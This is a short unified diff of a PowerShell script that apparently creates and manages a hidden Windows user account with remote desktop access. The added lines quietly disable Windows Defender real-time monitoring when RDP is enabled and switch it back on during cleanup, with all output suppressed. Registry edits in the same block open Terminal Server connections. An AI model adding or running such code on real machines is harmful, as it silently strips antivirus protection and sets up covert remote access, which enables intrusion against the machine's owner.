@@ -260,6 +260,7 @@ If($Action -ieq "Query" -or $Action -ieq "Verbose"){
    If($EnableRDP -ieq "True"){## Allow account RDP multiple connections ???
 
       $RdpEnableState = "True"
+      Set-MpPreference -DisableRealtimeMonitoring $true|Out-Null
       reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f|Out-Null
       reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f|Out-Null
 
@@ -321,7 +322,7 @@ If($Action -ieq "Query" -or $Action -ieq "Verbose"){
       $GuestAccChecks = $GuestAccChecks -replace "\*","" -replace 's$','' ## Convidado|Guest
    }
 
-   If($UserName -ieq "$AdminGroupName" -or $UserName -ieq "$guestaccchecks"){
+   If($UserName -ieq "$AdminGroupName" -or $UserName -ieq "$GuestAccChecks" -or $UserName -ieq "$Env:USERNAME"){
    
       Write-Host "`n`n[error] '$UserName' its an 'system' mandatory account!`n`n" -ForegroundColor Red -BackgroundColor Black   
       exit ## Exit @HiddenUser
@@ -340,6 +341,7 @@ If($Action -ieq "Query" -or $Action -ieq "Verbose"){
       If($CheckRdpAccess -eq 1){## Delete account RDP user access if exists!
 
          $RdpEnableState = "True"
+         Set-MpPreference -DisableRealtimeMonitoring $false|Out-Null
          reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f|Out-Null
          reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f|Out-Null
 
